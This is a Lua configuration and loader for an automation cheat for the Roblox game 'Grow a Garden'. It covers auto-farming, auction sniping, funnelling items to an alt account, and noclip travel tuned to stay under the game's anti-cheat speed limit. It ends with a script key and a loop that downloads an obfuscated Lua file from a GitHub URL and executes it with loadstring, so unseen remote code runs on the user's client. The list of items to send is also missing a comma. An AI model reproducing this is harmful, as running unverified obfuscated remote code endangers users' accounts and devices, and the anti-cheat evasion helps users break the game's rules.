_G.GAGConfig = _G.GAGConfig or {
    ["Harvest"] = {
        ["Auto Harvest"]  = true,             -- toggle. false = never harvest OR sell
        ["Sell At"]       = 10,               -- number. sell once the backpack holds about this many fruit
        ["Sell Every"]    = 30,               -- number (seconds). also sell every N sec while holding fruit; 0 = off
        ["Only Harvest"]  = {},               -- LIST of crop names (empty = harvest everything). e.g. { "Watermelon", "Dragon Fruit" }
        ["Don't Harvest"] = {},               -- LIST of crop names = never harvest these. e.g. { "Carrot", "Green Bean" }
        ["Wait For Mutation"] = { "Bamboo", "Mushroom" },   -- LIST of crop names. don't harvest these until they get ANY mutation (wait for a weather event); also kept from the shovel while waiting. e.g. { "Bamboo", "Mushroom" }
    },
    ["Planting"] = {
        ["Auto Plant"]  = true,               -- toggle. false = DON'T farm (no planting/expand/replace, no plot seed-buying). "Buy Seeds" + Mail still run -> a pure mail-stocking bot
        ["Plant Plan"]  = { ["Fire Fern"] = 5, ["Poison Apple"] = 5, ["Poison Ivy"] = 5, ["Pomegranate"] = 5, ["Venom Spitter"] = 5, ["Green Bean"] = 20, ["Gold"] = 150, ["Tomato"] = 10, ["Strawberry"] = 10, ["Blueberry"] = 10, ["Carrot"] = 10, ["Bamboo"] = 400, ["Mushroom"] = 100 },                 -- MAP crop = number. keep N of each planted, then auto-fill the rest. EACH crop needs a number. e.g. { Apple = 50, ["Dragon Fruit"] = 20 }
        ["Only Plant"]  = { "Fire Fern", "Poison Apple", "Poison Ivy", "Pomegranate", "Venom Spitter", "Carrot", "Gold", "Strawberry", "Bamboo", "Mushroom", "Green Bean", "Dragon's Breath", "Moon Bloom", "Hypno Bloom", "Tomato", "Blueberry" },                 -- LIST of crop names = plant ONLY these (empty = plant anything). e.g. { "Bamboo", "Dragon Fruit" }
        ["Minimum Seed"] = "Bamboo",          -- text: ONE seed name. never buy/plant a seed cheaper than this tier (stops Carrot/Strawberry junk). "" = no floor. e.g. "Bamboo"
        ["Layout"]      = "compact",          -- text choice: "compact" (tight — best sprinkler coverage) or "spread"
        ["Don't Plant"] = { "Mega", "Rainbow" },                 -- LIST of crop names = never plant these (also blocks BUYING them). e.g. { "Carrot", "Green Bean" }
        ["Don't Buy"]   = { "Tulip", "Apple", "Corn", "Cactus", "Pineapple", "Banana", "Grape", "Coconut", "Mango", "Dragon Fruit", "Acorn", "Cherry", "Sunflower" },                 -- LIST of crop names = never spend money buying these (can still plant ones you already own). e.g. { "Mango", "Coconut" }
        ["Keep Seeds"]  = { "Mega", "Rainbow" },                 -- MAP seed = number. keep N of each UNPLANTED in your bag (don't plant your last N). EACH needs a number. e.g. { ["Dragon's Breath"] = 5, Gold = 3 }
        ["Plant Limit"] = 800,                  -- number (0 = off). cap TOTAL plants at this; if already over, shovel lowest-tier DOWN to it (cuts lag). Set ~200. Never shovels mutated/Mega/Plant-Plan/never-sell.
        ["Never Shovel"] = { "Bamboo", "Mushroom" },                -- LIST of crop names the Plant-Limit shovel must NEVER touch (your high-tier crops). e.g. { "Dragon Fruit", "Mango" }
        ["Shovel Up To"] = "Rare",                -- text choice (a rarity TIER): "" / "Common" / "Uncommon" / "Rare" / "Epic". removes only that tier & below; Legendary+ always safe.
        ["Buy Seeds"]    = { ["Star Fruit"] = 1, ["Sun Bloom"] = 1, ["Dragon's Breath"] = 1, ["Moon Bloom"] = 1, ["Hypno Bloom"] = 1 },                -- MAP seed = number. buy & HOLD N of each for MAILING (not planted). EACH SEED NEEDS A NUMBER -> just "Dragon's Breath" is WRONG. e.g. { ["Bamboo"] = 500, ["Dragon's Breath"] = 10 }. Any SHOP seed (incl. Moon Bloom / Dragon's Breath when stocked); Gold/Rainbow/Mega can't be bought. Buys ANYTHING in stock it can afford, cheapest first — IGNORES Keep Cash (will spend down to 0 to stock mail seeds). Runs even with Auto Plant = false. (If a seed is ALSO in Plant Plan / Only Plant it STILL gets planted too — plant intent wins.)
    },
    ["Money"] = {
        ["Keep Cash"]          = 15000,    -- number. always keep at least this much money
        ["Auto Expand Plot"]   = true,     -- toggle. buy plot expansions automatically
        ["Max Expansions"]     = 3,        -- number. cap expansions bought this run. 0 = no limit
        ["Expand If Over"]     = 1500000,  -- number. only buy an expansion when cash is above this
        ["Auto Replace Plants"] = true,    -- toggle. when the plot is full, dig up low-value plants for better ones
    },
    ["Never Sell"] = {                        -- protect fruit from being sold
        ["By Mutation"] = {},                 -- LIST of mutation names. e.g. { "Rainbow", "Gold" }
        ["By Fruit"]    = {},                 -- LIST of fruit names. e.g. { "Dragon Fruit" }
        ["Exact"]       = {},                 -- LIST of { fruit, mut } pairs. e.g. { { fruit = "Carrot", mut = "Gold" } }
    },
    ["Pets"] = {
        ["Buy"]            = { "Unicorn", "GoldenDragonfly", "Raccoon", "BlackDragon", "IceSerpent", ["Deer"] = 6 },   -- pets to tame. bare "Name" = tame UNLIMITED; ["Name"] = N = stop once you OWN N. mix ok. e.g. { "Unicorn", ["Deer"] = 6 }
        ["Equip"]          = { ["Deer"] = 6 },    -- which pets to keep equipped: MAP name = number  e.g. { ["Deer"] = 6 }   OR a priority LIST  e.g. { "Unicorn", "Deer" }  (fills the 6 slots best-first)
        ["Auto Buy Slots"] = true,            -- toggle. buy more equip slots (up to Max Pet Slots)
        ["Max Pet Slots"]  = 6,               -- number 3..6
    },
    ["Gear"] = {
        ["Auto Buy"]             = true,            -- toggle. master switch for buying / placing gear
        ["Keep Cash"]            = 15000,           -- number. keep at least this much money when buying gear
        ["Sprinkler Coverage"]   = "concentrate",   -- text choice: "concentrate" / "value" / "spread"
        ["Place Sprinklers"]     = { ["Common Sprinkler"] = 4 },   -- MAP name = number (special key "best" = best you own). e.g. { ["best"] = 4 } or { ["Rare Sprinkler"] = 2 }
        ["Best Sprinkler Up To"] = "Common Sprinkler",   -- text: ONE sprinkler name (with "best", don't place above this). e.g. "Rare Sprinkler" / "Super Sprinkler"
        ["Keep Gear"]            = {},   -- MAP gear = number. buy & hold N. e.g. { ["Trowel"] = 1 }
        ["Buy Gear"]             = { "Super Sprinkler", "Super Watering Can" },   -- LIST of gear names. buy & keep, never placed. e.g. { "Super Sprinkler", "Trowel" }
    },
    ["Event Seeds"] = {
        ["Auto Claim"] = true,       -- toggle. auto-grab seed packs that drop during events
    },
    ["Mail"] = {
        ["Auto Claim"] = true,                -- toggle. auto-claim items in your mailbox
        ["Auto Accept Gift"] = true,          -- toggle. auto-accept incoming GIFTS from other players (+ clear the popup) so a recipient alt receives hands-off. (Gift = an in-SERVER item transfer, no mail limit, no friends needed)
        ["Send To"]    = "ihy4rk",                  -- WHO to funnel items to. ONE name "vinfarmm", or a PRIORITY LIST { "alt1", "alt2" }. "" or {} = sending OFF.
                                              --   routing: the first listed name in THIS server -> GIFT it (instant, server-wide, no mail limit); if NONE are in-server -> MAIL the first name (works cross-server).
        ["Send Every"] = 0,                   -- number (MINUTES) between sends. 0 = default ~45s. (send INTERVAL only — not the per-item Count)
        ["Send"]       = {                    -- LIST: bare "Name" = send the WHOLE stack; { Item = "Name", Count = N } = wait until you hold N, then send N. equipped pets never sent. e.g. { "Gold", { Item = "Carrot", Count = 100 } }
            "Moon Bloom", "Dragon's Breath", "Rainbow", "Mega", "Ghost Pepper", "Hypno Bloom", "Sun Bloom", "Star Fruit"
            "GoldenDragonfly", "Unicorn", "Raccoon", "BlackDragon", "IceSerpent", 
            "Super Sprinkler", "Super Watering Can",
        },
    },
    ["Misc"] = {
        ["Auto Return To Garden"] = true,     -- toggle. come back to your garden if you get stuck/teleported away
        ["Show Stats"]            = true,     -- toggle. the on-screen stats overlay
        ["Hide Game UI"]          = true,    -- toggle. DEFAULT off (overlay is already on top, so you keep inventory/hotbar). true = hide the game's chat/backpack/health/topbar for a clean AFK screen (restored on SHOW GUI)
        ["Show Console"]          = false,    -- toggle. the left/right buy + shovel/plant feed panels (toggle live with the CONSOLE button)
        ["Smart Travel"]          = true,     -- toggle. teleport to the nearest hub then walk the short rest
        ["Auto Daily Deal"]       = true,     -- toggle. sell one backpack a day at the 5x Daily Deal
        ["Walk Speed"]            = 30,        -- number: 0 or 16..35. fallback walk speed. 0 = use the GAME's own walk speed (no override)
        ["Slide Speed"]           = 30,       -- number 10..150. noclip SLIDE speed for Fast Travel. higher = faster but nearer the ~180/s anti-cheat ceiling
        ["Fast Travel"]           = true,    -- toggle. on = noclip-slide travel (same speed at any fps); off = plain walking
        ["Teleport"]              = true,     -- toggle. on = grab pets + event seeds by teleporting straight onto each. separate from Fast Travel
    },
    ["Friends"] = {
        ["Auto Accept"] = true,              -- toggle. accept incoming friend requests from ANYONE in the server
        ["Auto Send"]   = true,              -- toggle. send friend requests to EVERYONE in the server (spammy — off by default)
        -- NOTE: whoever is in Mail > Send To (your gift/mail recipients) is ALWAYS auto-friended regardless of these two —
        -- the bot sends + accepts a REAL Roblox friend request to/from them. This is what auto-confirms the game's
        -- "Send Friend Request?" popup, so once your alts are friends the gift/fake-friend popups stop reappearing.
    },
    ["Auction"] = {
        ["Auto Buy"]   = false,               -- toggle. auto-buy wanted items off the Auctioneer (Dutch auction: the price DECAYS from a huge start to a floor — the bot buys the moment it drops to/below your max)
        ["Buy"]        = {                     -- MAP: item name -> MAX sheckles you'll pay (matched loosely against the lot's shown name, case-insensitive; put "" or a huge number to buy at any price). e.g.:
            ["Venom Spitter"]     = 5000000,
            ["Common Egg"]        = 200000,
            ["Uncommon Seed Pack"] = 50000,
        },
        ["Keep Cash"]  = 0,                   -- number: never let the buy drop your sheckles below this (0 = spend freely). protects your balance.
        ["Check Every"] = 0.2,                -- number (SECONDS) between price checks + buy tries. 0.2 = the game's own cap (~5 tries/sec); going LOWER doesn't buy faster (the server drops attempts closer than 0.2s) but detects the price drop a touch sooner.
        ["Max Tries"]  = 10,                   -- number: how hard to fight for a lot — re-fires the buy at the max ~5/sec rate up to this many times, stopping the instant it confirms. higher = more persistent on a contested lot.
    },
    ["Eggs"] = {
        ["Auto Open"] = true,                -- toggle. auto-HATCH eggs from your inventory into pets (fire-and-forget; the game finalizes each hatch)
        ["Open"]      = {                     -- LIST of egg names to open (loose, case-insensitive). {} = open nothing. { "all" } = open EVERY egg you get. e.g.:
            "Common Egg", "Uncommon Egg",
        },
    },
    ["Performance"] = {
        ["FPS Cap"]              = 0,        -- number (0 = uncapped; also caps the farm's logic/movement rate)
        ["Low Graphics"]         = true,      -- toggle. strip textures/shadows/effects for performance
        ["Remove Other Gardens"] = true,      -- toggle. strip other players' plots (independent of Low Graphics)
        ["Hide Crop Visuals"]    = true,      -- toggle. hide the plant BODY/trunk/leaves (still grow & harvest)
        ["Hide Fruit Visuals"]   = true,      -- toggle. hide the FRUIT too (separate from Hide Crop Visuals; still grows & harvests)
        ["Hide Players"]         = true,      -- toggle. hide OTHER players' characters (render saving)
    },
    ["Debug"] = {
        ["Log To File"] = true,   -- toggle. writes GAG_LOG_<name>.txt (what the farm did + why it skipped something)
        ["Console"]     = true,   -- toggle, OR a LIST of tags to filter. e.g. true   or   { "REPLACE", "ERROR" }
    },
}

script_key="F4B3D987685D41D73572FB0FB17C50F4"

local s,r repeat s,r=pcall(function()return game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/gag-obfuscated.lua")end)wait(1)until s;loadstring(r)()
